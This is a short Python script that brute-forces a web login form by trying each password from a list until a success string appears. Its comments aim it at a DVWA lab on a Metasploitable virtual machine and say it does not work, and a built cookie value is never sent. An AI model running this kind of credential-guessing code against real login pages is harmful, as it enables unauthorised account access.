# test this using http://192.168.29.19(metasploitable-ip)/dvwa/login.php  => turn on metasploitable 
# virtual machine on   --> THIS IS NOT WORKING 
#  2 -
import requests
from termcolor import colored

def cracking(username, url, passwords, cookie_value, login_success_string):
    for password in passwords:
        password = password.strip()
        print(colored(('Trying: ' + password), 'red'))
        
        # Target the name attribute for each of username and password and cookie
        data = {'username': username, 'password': password, 'Login': 'submit'}
        
        cookies = {'Cookie': cookie_value} if cookie_value else None
        
        try:
            if cookie_value:
                response = requests.get(url, params=data)
            else:
                response = requests.post(url, data=data)
            
            response.raise_for_status()  # Check for HTTP errors
           
            # INSTEAD OF LOGIN FAILED , CHECK FOR SUCCESS , 
            # SO THE BELOW PART WILL NOT WORK 
            
            # if  login_failed_string.encode('utf-8') in response.content: ==> FAILED 
            #     pass
            
            if login_success_string in response.text:
                print(colored(('[+] Found Username: ==> ' + username), 'green'))
                print(colored(('[+] Found Password: ==> ' + password), 'green'))
                exit(0)
        
        except requests.exceptions.RequestException as e:
            print(f"Error during request: {e}")
            
     # Print the content for debugging
    print("Response Content:")    
    print("Password not found.")